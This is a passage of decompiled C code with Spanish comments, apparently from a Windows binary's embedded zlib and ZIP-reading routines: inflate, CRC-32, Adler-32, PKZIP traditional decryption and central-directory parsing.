      param_6 = (int *)((uint)param_6 >> (pbVar12[1] & 0x1f));
      uVar9 = uVar9 - pbVar12[1];
      if ((bVar1 & 0x10) != 0) {
        uVar6 = uVar6 & 0xf;
        uVar10 = *(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6;
        param_6 = (int *)((uint)param_6 >> (sbyte)uVar6);
        uVar10 = uVar10 + *(int *)(pbVar12 + 4);
        for (uVar9 = uVar9 - uVar6; uVar9 < 0xf; uVar9 = uVar9 + 8) {
          local_8 = local_8 - 1;
          param_6 = (int *)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
          local_c = local_c + 1;
        }
        uVar6 = uVar2 & (uint)param_6;
        iVar4 = param_4 + uVar6 * 8;
        param_6 = (int *)((uint)param_6 >> (*(byte *)(iVar4 + 1) & 0x1f));
        uVar9 = uVar9 - *(byte *)(iVar4 + 1);
        bVar1 = *(byte *)(param_4 + uVar6 * 8);
        while ((bVar1 & 0x10) == 0) {
          if ((bVar1 & 0x40) != 0) {
            piVar3[6] = (int)s_invalid_distance_code_0040f618;
            uVar8 = piVar3[1] - local_8;
            if (uVar9 >> 3 < piVar3[1] - local_8) {
              uVar8 = uVar9 >> 3;
            }
            uStack_2c = 0xfffffffd;
            goto LAB_004053ed;
          }
          iVar7 = (*(uint *)(&DAT_0040bca8 + (uint)bVar1 * 4) & (uint)param_6) + *(int *)(iVar4 + 4)
          ;
          pbVar12 = (byte *)(iVar4 + iVar7 * 8);
          iVar4 = iVar4 + iVar7 * 8;
          param_6 = (int *)((uint)param_6 >> (*(byte *)(iVar4 + 1) & 0x1f));
          uVar9 = uVar9 - *(byte *)(iVar4 + 1);
          bVar1 = *pbVar12;
        }
        uVar6 = bVar1 & 0xf;
        for (; uVar9 < uVar6; uVar9 = uVar9 + 8) {
          local_8 = local_8 - 1;
          param_6 = (int *)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
          local_c = local_c + 1;
        }
        uVar11 = *(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6;
        uVar9 = uVar9 - uVar6;
        param_6 = (int *)((uint)param_6 >> (sbyte)uVar6);
        local_14 = local_14 + -uVar10;
        pbVar5 = local_10 + -(uVar11 + *(int *)(iVar4 + 4));
        pbVar12 = *(byte **)(param_5 + 0x28);
        if (pbVar5 < pbVar12) {
          do {
            pbVar5 = pbVar5 + (*(int *)(param_5 + 0x2c) - (int)pbVar12);
          } while (pbVar5 < pbVar12);
          uVar6 = *(int *)(param_5 + 0x2c) - (int)pbVar5;
          if (uVar6 < uVar10) {
            param_1 = uVar10 - uVar6;
            do {
              *local_10 = *pbVar5;
              local_10 = local_10 + 1;
              pbVar5 = pbVar5 + 1;
              uVar6 = uVar6 - 1;
            } while (uVar6 != 0);
            pbVar12 = *(byte **)(param_5 + 0x28);
            do {
              *local_10 = *pbVar12;
              local_10 = local_10 + 1;
              pbVar12 = pbVar12 + 1;
              param_1 = param_1 + -1;
            } while (param_1 != 0);
          }
          else {
            *local_10 = *pbVar5;
            local_10[1] = pbVar5[1];
            local_10 = local_10 + 2;
            pbVar5 = pbVar5 + 2;
            param_1 = uVar10 - 2;
            do {
              *local_10 = *pbVar5;
              local_10 = local_10 + 1;
              pbVar5 = pbVar5 + 1;
              param_1 = param_1 + -1;
            } while (param_1 != 0);
          }
        }
        else {
          *local_10 = *pbVar5;
          local_10[1] = pbVar5[1];
          local_10 = local_10 + 2;
          pbVar5 = pbVar5 + 2;
          param_1 = uVar10 - 2;
          do {
            *local_10 = *pbVar5;
            local_10 = local_10 + 1;
            pbVar5 = pbVar5 + 1;
            param_1 = param_1 + -1;
          } while (param_1 != 0);
        }
        goto LAB_0040536f;
      }
      if ((bVar1 & 0x40) == 0) break;
      if ((bVar1 & 0x20) == 0) {
        piVar3[6] = (int)s_invalid_literal_length_code_0040f630;
        uVar8 = piVar3[1] - local_8;
        if (uVar9 >> 3 < piVar3[1] - local_8) {
          uVar8 = uVar9 >> 3;
        }
        uStack_2c = 0xfffffffd;
      }
      else {
        uVar8 = piVar3[1] - local_8;
        if (uVar9 >> 3 < piVar3[1] - local_8) {
          uVar8 = uVar9 >> 3;
        }
        uStack_2c = 1;
      }
      goto LAB_004053ed;
    }
    param_6 = (int *)((uint)param_6 >> (pbVar12[1] & 0x1f));
    uVar9 = uVar9 - pbVar12[1];
    local_14 = local_14 + -1;
    *local_10 = pbVar12[4];
    local_10 = local_10 + 1;
LAB_0040536f:
    if ((local_14 < (byte *)0x102) || (local_8 < 10)) {
      uVar8 = piVar3[1] - local_8;
      if (uVar9 >> 3 < piVar3[1] - local_8) {
        uVar8 = uVar9 >> 3;
      }
      uStack_2c = 0;
LAB_004053ed:
      *(int **)(param_5 + 0x20) = param_6;
      *(uint *)(param_5 + 0x1c) = uVar9 + uVar8 * -8;
      piVar3[1] = uVar8 + local_8;
      iVar4 = *piVar3;
      *piVar3 = (int)local_c - uVar8;
      piVar3[2] = piVar3[2] + (((int)local_c - uVar8) - iVar4);
      *(byte **)(param_5 + 0x34) = local_10;
      return uStack_2c;
    }
  } while( true );
  pbVar12 = pbVar12 + ((*(uint *)(&DAT_0040bca8 + uVar6 * 4) & (uint)param_6) +
                      *(int *)(pbVar12 + 4)) * 8;
  bVar1 = *pbVar12;
  goto LAB_004051d5;
}



/* Calcula CRC-32 sobre un bloque de bytes. */
uint __cdecl FUN_0040541f(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  if (param_2 == (byte *)0x0) {
    return 0;
  }
  uVar1 = ~param_1;
  if (7 < param_3) {
    uVar2 = param_3 >> 3;
    do {
      param_3 = param_3 - 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)*param_2) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[1]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[2]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[3]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[4]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[5]) * 4) ^ uVar1 >> 8;
      uVar1 = *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[6]) * 4) ^ uVar1 >> 8;
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)param_2[7]) * 4);
      param_2 = param_2 + 8;
      uVar2 = uVar2 - 1;
    } while (uVar2 != 0);
  }
  for (; param_3 != 0; param_3 = param_3 - 1) {
    uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_0040d054 + (uVar1 & 0xff ^ (uint)*param_2) * 4);
    param_2 = param_2 + 1;
  }
  return ~uVar1;
}



/* Actualiza el estado del generador de flujo usado para proteger datos. */
void __cdecl FUN_00405535(uint *param_1,byte param_2)

{
  uint uVar1;
  
  uVar1 = *(uint *)(&DAT_0040d054 + (*param_1 & 0xff ^ (uint)param_2) * 4) ^ *param_1 >> 8;
  *param_1 = uVar1;
  uVar1 = ((uVar1 & 0xff) + param_1[1]) * 0x8088405 + 1;
  param_1[1] = uVar1;
  param_1[2] = *(uint *)(&DAT_0040d054 + (uVar1 >> 0x18 ^ param_1[2] & 0xff) * 4) ^ param_1[2] >> 8;
  return;
}



/* Deriva un byte de flujo a partir del estado interno. */
uint __cdecl FUN_00405588(int param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 8) & 0xfffd | 2;
  return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
}



/* Descifra un byte y actualiza el estado de realimentacion. */
byte __cdecl FUN_004055a3(uint *param_1,byte param_2)

{
  byte bVar1;
  uint uVar2;
  
  uVar2 = FUN_00405588((int)param_1);
  bVar1 = param_2 ^ (byte)uVar2;
  FUN_00405535(param_1,bVar1);
  return bVar1;
}



/* Calcula la suma Adler-32 utilizada por el formato zlib. */
uint __cdecl FUN_004055c4(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  uint uVar19;
  
  uVar3 = param_1 & 0xffff;
  uVar19 = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    uVar3 = 1;
  }
  else {
    while (param_3 != 0) {
      uVar2 = 0x15b0;
      if (param_3 < 0x15b0) {
        uVar2 = param_3;
      }
      param_3 = param_3 - uVar2;
      if (0xf < (int)uVar2) {
        uVar1 = uVar2 >> 4;
        uVar2 = uVar2 + uVar1 * -0x10;
        do {
          iVar4 = uVar3 + *param_2;
          iVar5 = iVar4 + (uint)param_2[1];
          iVar6 = iVar5 + (uint)param_2[2];
          iVar7 = iVar6 + (uint)param_2[3];
          iVar8 = iVar7 + (uint)param_2[4];
          iVar9 = iVar8 + (uint)param_2[5];
          iVar10 = iVar9 + (uint)param_2[6];
          iVar11 = iVar10 + (uint)param_2[7];
          iVar12 = iVar11 + (uint)param_2[8];
          iVar13 = iVar12 + (uint)param_2[9];
          iVar14 = iVar13 + (uint)param_2[10];
          iVar15 = iVar14 + (uint)param_2[0xb];
          iVar16 = iVar15 + (uint)param_2[0xc];
          iVar17 = iVar16 + (uint)param_2[0xd];
          iVar18 = iVar17 + (uint)param_2[0xe];
          uVar3 = iVar18 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12
                   + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + uVar3;
          param_2 = param_2 + 0x10;
          uVar1 = uVar1 - 1;
        } while (uVar1 != 0);
      }
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        uVar3 = uVar3 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar3;
      }
      uVar3 = uVar3 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    }
    uVar3 = uVar19 << 0x10 | uVar3;
  }
  return uVar3;
}



/* Adaptador de asignacion para el descompresor. */
void __cdecl FUN_004056dd(undefined4 param_1,size_t param_2,size_t param_3)

{
  calloc(param_2,param_3);
  return;
}



/* Reinicia el estado del descompresor y su anillo de salida. */
undefined4 __cdecl FUN_004056fa(int param_1)

{
  uint *puVar1;
  
  if ((param_1 != 0) && (puVar1 = *(uint **)(param_1 + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    FUN_004042c0(*(int **)(*(int *)(param_1 + 0x1c) + 0x14),param_1,(int *)0x0);
    return 0;
  }
  return 0xfffffffe;
}



/* Libera el estado completo del descompresor. */
undefined4 __cdecl FUN_00405739(int param_1)

{
  int *piVar1;
  
  if (((param_1 != 0) && (*(int *)(param_1 + 0x1c) != 0)) && (*(int *)(param_1 + 0x24) != 0)) {
    piVar1 = *(int **)(*(int *)(param_1 + 0x1c) + 0x14);
    if (piVar1 != (int *)0x0) {
      FUN_00404be5(piVar1,param_1);
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



// WARNING: Removing unreachable block (ram,0x00405836)

/* Inicializa el contexto zlib y crea las estructuras de decodificacion. */
undefined4 __cdecl FUN_00405777(int param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 uVar3;
  
  if (param_1 == 0) {
    uVar3 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(param_1 + 0x18) = 0;
    if (*(int *)(param_1 + 0x20) == 0) {
      *(code **)(param_1 + 0x20) = FUN_004056dd;
      *(undefined4 *)(param_1 + 0x28) = 0;
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      *(undefined1 **)(param_1 + 0x24) = &LAB_004056ee;
    }
    iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x18);
    *(int *)(param_1 + 0x1c) = iVar1;
    if (iVar1 != 0) {
      *(undefined4 *)(iVar1 + 0x14) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 0;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 1;
      *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x10) = 0xf;
      piVar2 = FUN_0040432b(param_1,~-(uint)(*(int *)(*(int *)(param_1 + 0x1c) + 0xc) != 0) &
                                    0x4055c4,0x8000);
      *(int **)(*(int *)(param_1 + 0x1c) + 0x14) = piVar2;
      if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) != 0) {
        FUN_004056fa(param_1);
        return 0;
      }
      FUN_00405739(param_1);
    }
    uVar3 = 0xfffffffc;
  }
  return uVar3;
}



/* Consume la cabecera zlib, descomprime datos y verifica el checksum final. */
uint __cdecl FUN_0040583c(int *param_1,uint param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 uVar4;
  
  if (((param_1 == (int *)0x0) || (puVar2 = (undefined4 *)param_1[7], puVar2 == (undefined4 *)0x0))
     || (*param_1 == 0)) {
LAB_00405b60:
    return 0xfffffffe;
  }
  uVar3 = 0xfffffffb;
  if (param_2 == 4) {
    param_2 = 0xfffffffb;
  }
  else {
    param_2 = 0;
  }
  uVar4 = *puVar2;
LAB_00405878:
  switch(uVar4) {
  case 0:
    if (param_1[1] == 0) {
      return uVar3;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2[1] = (uint)*(byte *)*param_1;
    puVar2 = (undefined4 *)param_1[7];
    uVar4 = puVar2[1];
    *param_1 = *param_1 + 1;
    if (((byte)uVar4 & 0xf) == 8) {
      if (((uint)puVar2[1] >> 4) + 8 <= (uint)puVar2[4]) {
        *puVar2 = 1;
        uVar3 = param_2;
        goto switchD_00405880_caseD_1;
      }
      *puVar2 = 0xd;
      param_1[6] = (int)s_invalid_window_size_0040f7e8;
    }
    else {
      *puVar2 = 0xd;
      param_1[6] = (int)s_unknown_compression_method_0040f7fc;
    }
    goto LAB_00405a73;
  case 1:
switchD_00405880_caseD_1:
    if (param_1[1] == 0) {
      return uVar3;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    puVar2 = (undefined4 *)param_1[7];
    bVar1 = *(byte *)*param_1;
    *param_1 = (int)((byte *)*param_1 + 1);
    if ((puVar2[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
      if ((bVar1 & 0x20) != 0) {
        *(undefined4 *)param_1[7] = 2;
        uVar3 = param_2;
        goto switchD_00405880_caseD_2;
      }
      *puVar2 = 7;
      uVar3 = param_2;
    }
    else {
      *puVar2 = 0xd;
      param_1[6] = (int)s_incorrect_header_check_0040f7d0;
      *(undefined4 *)(param_1[7] + 4) = 5;
      uVar3 = param_2;
    }
    break;
  case 2:
switchD_00405880_caseD_2:
    if (param_1[1] == 0) {
      return uVar3;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)*(byte *)*param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 3;
    uVar3 = param_2;
  case 3:
    goto switchD_00405880_caseD_3;
  case 4:
    goto switchD_00405880_caseD_4;
  case 5:
    goto switchD_00405880_caseD_5;
  case 6:
    *(undefined4 *)param_1[7] = 0xd;
    param_1[6] = (int)s_need_dictionary_0040f608;
    *(undefined4 *)(param_1[7] + 4) = 0;
    return 0xfffffffe;
  case 7:
    uVar3 = FUN_004043b6((uint *)puVar2[5],param_1,uVar3);
    if (uVar3 == 0xfffffffd) {
      *(undefined4 *)param_1[7] = 0xd;
      *(undefined4 *)(param_1[7] + 4) = 0;
      uVar3 = 0xfffffffd;
    }
    else {
      if (uVar3 == 0) {
        uVar3 = param_2;
      }
      if (uVar3 != 1) {
        return uVar3;
      }
      FUN_004042c0(*(int **)(param_1[7] + 0x14),(int)param_1,(int *)(param_1[7] + 4));
      puVar2 = (undefined4 *)param_1[7];
      if (puVar2[3] == 0) {
        *puVar2 = 8;
        uVar3 = param_2;
        goto switchD_00405880_caseD_8;
      }
      *puVar2 = 0xc;
      uVar3 = param_2;
    }
    break;
  case 8:
switchD_00405880_caseD_8:
    if (param_1[1] == 0) {
      return uVar3;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(uint *)(param_1[7] + 8) = (uint)*(byte *)*param_1 << 0x18;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 9;
    uVar3 = param_2;
  case 9:
    if (param_1[1] == 0) {
      return uVar3;
    }
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1 * 0x10000;
    *param_1 = *param_1 + 1;
    *(undefined4 *)param_1[7] = 10;
    uVar3 = param_2;
  case 10:
    goto switchD_00405880_caseD_a;
  case 0xb:
    goto switchD_00405880_caseD_b;
  case 0xc:
    goto LAB_00405b60;
  case 0xd:
    return 0xfffffffd;
  default:
    goto LAB_00405b60;
  }
LAB_00405a7d:
  puVar2 = (undefined4 *)param_1[7];
  uVar4 = *puVar2;
  goto LAB_00405878;
switchD_00405880_caseD_a:
  if (param_1[1] == 0) {
    return uVar3;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 0xb;
  uVar3 = param_2;
switchD_00405880_caseD_b:
  if (param_1[1] == 0) {
    return uVar3;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1;
  puVar2 = (undefined4 *)param_1[7];
  *param_1 = *param_1 + 1;
  if (puVar2[1] == puVar2[2]) {
    *(undefined4 *)param_1[7] = 0xc;
LAB_00405b60:
    return 1;
  }
  *puVar2 = 0xd;
  param_1[6] = (int)s_incorrect_data_check_0040f7b8;
LAB_00405a73:
  *(undefined4 *)(param_1[7] + 4) = 5;
  uVar3 = param_2;
  goto LAB_00405a7d;
switchD_00405880_caseD_3:
  if (param_1[1] == 0) {
    return uVar3;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1 * 0x10000;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 4;
  uVar3 = param_2;
switchD_00405880_caseD_4:
  if (param_1[1] == 0) {
    return uVar3;
  }
  param_1[2] = param_1[2] + 1;
  param_1[1] = param_1[1] + -1;
  *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1 * 0x100;
  *param_1 = *param_1 + 1;
  *(undefined4 *)param_1[7] = 5;
  uVar3 = param_2;
switchD_00405880_caseD_5:
  if (param_1[1] != 0) {
    param_1[2] = param_1[2] + 1;
    param_1[1] = param_1[1] + -1;
    *(int *)(param_1[7] + 8) = *(int *)(param_1[7] + 8) + (uint)*(byte *)*param_1;
    *param_1 = *param_1 + 1;
    param_1[0xc] = ((undefined4 *)param_1[7])[2];
    *(undefined4 *)param_1[7] = 6;
    return 2;
  }
  return uVar3;
}



/* Abre una entrada ZIP desde archivo, memoria o un lector abstracto. */
undefined1 * __cdecl FUN_00405bae(LPCSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)

{
  undefined1 uVar1;
  LPCSTR hFile;
  DWORD DVar2;
  undefined1 *puVar3;
  bool local_6;
  undefined1 local_5;
  
  if (((param_3 != 1) && (param_3 != 2)) && (param_3 != 3)) {
    *param_4 = 0x10000;
    return (undefined1 *)0x0;
  }
  *param_4 = 0;
  local_6 = false;
  local_5 = 0;
  hFile = param_1;
  uVar1 = 0;
  if (param_3 != 1) {
    hFile = (LPCSTR)0x0;
    if (param_3 != 2) goto LAB_00405c36;
    hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile == (LPCSTR)0xffffffff) {
      *param_4 = 0x200;
      return (undefined1 *)0x0;
    }
    local_5 = 1;
    uVar1 = local_5;
  }
  local_5 = uVar1;
  DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
  local_6 = DVar2 != 0xffffffff;
LAB_00405c36:
  puVar3 = operator_new(0x20);
  if ((param_3 == 1) || (param_3 == 2)) {
    *puVar3 = 1;
    puVar3[0x10] = local_5;
    puVar3[1] = local_6;
    *(LPCSTR *)(puVar3 + 4) = hFile;
    puVar3[8] = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
    if (local_6 != false) {
      DVar2 = SetFilePointer(hFile,0,(PLONG)0x0,1);
      *(DWORD *)(puVar3 + 0xc) = DVar2;
    }
  }
  else {
    *puVar3 = 0;
    *(LPCSTR *)(puVar3 + 0x14) = param_1;
    puVar3[1] = 1;
    puVar3[0x10] = 0;
    *(undefined4 *)(puVar3 + 0x18) = param_2;
    *(undefined4 *)(puVar3 + 0x1c) = 0;
    *(undefined4 *)(puVar3 + 0xc) = 0;
  }
  *param_4 = 0;
  return puVar3;
}



/* Cierra y libera el lector de una entrada ZIP. */
undefined4 __cdecl FUN_00405c9f(void *param_1)

{
  if (param_1 == (void *)0x0) {
    return 0xffffffff;
  }
  if (*(char *)((int)param_1 + 0x10) != '\0') {
    CloseHandle(*(HANDLE *)((int)param_1 + 4));
  }
  operator_delete(param_1);
  return 0;
}



/* Indica si el lector mantiene un error de E/S. */
undefined4 __cdecl FUN_00405cc7(char *param_1)

{
  if ((*param_1 != '\0') && (param_1[8] != '\0')) {
    return 1;
  }
  return 0;
}



/* Devuelve la posicion actual del lector. */
int __cdecl FUN_00405cdd(char *param_1)

{
  DWORD DVar1;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      DVar1 = SetFilePointer(*(HANDLE *)(param_1 + 4),0,(PLONG)0x0,1);
      return DVar1 - *(int *)(param_1 + 0xc);
    }
    if (*param_1 != '\0') {
      return 0;
    }
  }
  return *(int *)(param_1 + 0x1c);
}



/* Mueve el cursor del lector segun el origen solicitado. */
undefined4 __cdecl FUN_00405d0e(char *param_1,int param_2,int param_3)

{
  DWORD dwMoveMethod;
  
  if (*param_1 != '\0') {
    if (param_1[1] != '\0') {
      if (param_3 == 0) {
        dwMoveMethod = 0;
        param_2 = *(int *)(param_1 + 0xc) + param_2;
      }
      else if (param_3 == 1) {
        dwMoveMethod = 1;
      }
      else {
        if (param_3 != 2) {
          return 0x13;
        }
        dwMoveMethod = 2;
      }
      SetFilePointer(*(HANDLE *)(param_1 + 4),param_2,(PLONG)0x0,dwMoveMethod);
      return 0;
    }
    if (*param_1 != '\0') {
      return 0x1d;
    }
  }
  if (param_3 != 0) {
    if (param_3 == 1) {
      *(int *)(param_1 + 0x1c) = *(int *)(param_1 + 0x1c) + param_2;
      return 0;
    }
    if (param_3 != 2) {
      return 0;
    }
    param_2 = *(int *)(param_1 + 0x18) + param_2;
  }
  *(int *)(param_1 + 0x1c) = param_2;
  return 0;
}



/* Lee elementos desde memoria o archivo y devuelve cuantos completo. */
uint __cdecl FUN_00405d8a(void *param_1,uint param_2,int param_3,char *param_4)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  BOOL BVar4;
  void *_Size;
  
  pcVar3 = param_4;
  _Size = (void *)(param_2 * param_3);
  if (*param_4 == '\0') {
    iVar2 = *(int *)(param_4 + 0x1c);
    if (*(uint *)(param_4 + 0x18) < (uint)(iVar2 + (int)_Size)) {
      _Size = (void *)(*(uint *)(param_4 + 0x18) - iVar2);
    }
    memcpy(param_1,(void *)(*(int *)(param_4 + 0x14) + iVar2),(size_t)_Size);
    piVar1 = (int *)(pcVar3 + 0x1c);
    *piVar1 = *piVar1 + (int)_Size;
    param_1 = _Size;
  }
  else {
    BVar4 = ReadFile(*(HANDLE *)(param_4 + 4),param_1,(DWORD)_Size,(LPDWORD)&param_1,
                     (LPOVERLAPPED)0x0);
    if (BVar4 == 0) {
      pcVar3[8] = '\x01';
    }
  }
  return (uint)param_1 / param_2;
}



/* Lee un byte del lector y traduce su estado a codigo de error. */
int __cdecl FUN_00405def(char *param_1,uint *param_2)

{
  uint uVar1;
  int iVar2;
  byte local_5;
  
  uVar1 = FUN_00405d8a(&local_5,1,1,param_1);
  if (uVar1 == 1) {
    *param_2 = (uint)local_5;
    return 0;
  }
  iVar2 = FUN_00405cc7(param_1);
  return -(uint)(iVar2 != 0);
}



/* Lee un entero little-endian de 16 bits desde una entrada ZIP. */
void __cdecl FUN_00405e27(char *param_1,int *param_2)

{
  uint uVar1;
  int iVar2;
  uint local_8;
  
  iVar2 = FUN_00405def(param_1,&local_8);
  uVar1 = local_8;
  if ((iVar2 == 0) && (iVar2 = FUN_00405def(param_1,&local_8), iVar2 == 0)) {
    *param_2 = local_8 * 0x100 + uVar1;
    return;
  }
  *param_2 = 0;
  return;
}



/* Lee un entero little-endian de 32 bits desde una entrada ZIP. */
void __cdecl FUN_00405e6b(char *param_1,int *param_2)

{
  char *pcVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  pcVar1 = param_1;
  iVar3 = FUN_00405def(param_1,(uint *)&param_1);
  pcVar2 = param_1;
  if (iVar3 == 0) {
    iVar3 = FUN_00405def(pcVar1,(uint *)&param_1);
  }
  iVar4 = (int)param_1 * 0x100;
  if (iVar3 == 0) {
    iVar3 = FUN_00405def(pcVar1,(uint *)&param_1);
  }
  iVar5 = (int)param_1 * 0x10000;
  if ((iVar3 == 0) && (iVar3 = FUN_00405def(pcVar1,(uint *)&param_1), iVar3 == 0)) {
    *param_2 = (int)(pcVar2 + (int)param_1 * 0x1000000 + iVar5 + iVar4);
    return;
  }
  *param_2 = 0;
  return;
}



/* Busca la firma del directorio central ZIP desde el final del archivo. */
int __cdecl FUN_00405edf(char *param_1)

{
  int iVar1;
  uint uVar2;
  void *_Memory;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int local_10;
  uint local_c;
  uint local_8;
  
  iVar1 = FUN_00405d0e(param_1,0,2);
  if (iVar1 == 0) {
    uVar2 = FUN_00405cdd(param_1);
    local_8 = 0xffff;
    if (uVar2 < 0xffff) {
      local_8 = uVar2;
    }
    _Memory = malloc(0x404);
    if (_Memory != (void *)0x0) {
      local_10 = -1;
      local_c = 4;
      if (4 < local_8) {
        while( true ) {
          uVar3 = local_c + 0x400;
          local_c = local_8;
          if (uVar3 <= local_8) {
            local_c = uVar3;
          }
          iVar1 = uVar2 - local_c;
          uVar3 = 0x404;
          if (uVar2 - iVar1 < 0x405) {
            uVar3 = uVar2 - iVar1;
          }
          iVar4 = FUN_00405d0e(param_1,iVar1,0);
          if ((iVar4 != 0) || (uVar5 = FUN_00405d8a(_Memory,uVar3,1,param_1), uVar5 != 1)) break;
          iVar4 = uVar3 - 3;
          do {
            iVar6 = iVar4;
            iVar4 = iVar6 + -1;
            if (iVar6 < 0) goto LAB_00405fc0;
          } while ((((*(char *)(iVar4 + (int)_Memory) != 'P') ||
                    (*(char *)(iVar6 + (int)_Memory) != 'K')) ||
                   (*(char *)(iVar6 + 1 + (int)_Memory) != '\x05')) ||
                  (*(char *)(iVar6 + 2 + (int)_Memory) != '\x06'));
          local_10 = iVar4 + iVar1;
LAB_00405fc0:
          if ((local_10 != 0) || (local_8 <= local_c)) break;
        }
      }
      free(_Memory);
      return local_10;
    }
  }
  return -1;
}



/* Lee y valida el directorio central ZIP y crea un iterador de entradas. */
undefined4 * __cdecl FUN_00405fe2(char *param_1)

{
  char *pcVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  char **ppcVar5;
  undefined4 *puVar6;
  char *local_94;
  int local_90;
  int local_8c;
  int local_88;
  int local_78;
  int local_74;
  int local_70 [22];
  undefined4 local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  pcVar1 = param_1;
  if (param_1 == (char *)0x0) {
    return (undefined4 *)0x0;
  }
  param_1 = (char *)0x0;
  iVar2 = FUN_00405edf(pcVar1);
  if (iVar2 == -1) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405d0e(pcVar1,iVar2,0);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e6b(pcVar1,&local_14);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e27(pcVar1,&local_8);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e27(pcVar1,&local_10);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e27(pcVar1,&local_90);
  if (iVar3 != 0) {
    param_1 = (char *)0xffffffff;
  }
  iVar3 = FUN_00405e27(pcVar1,&local_c);
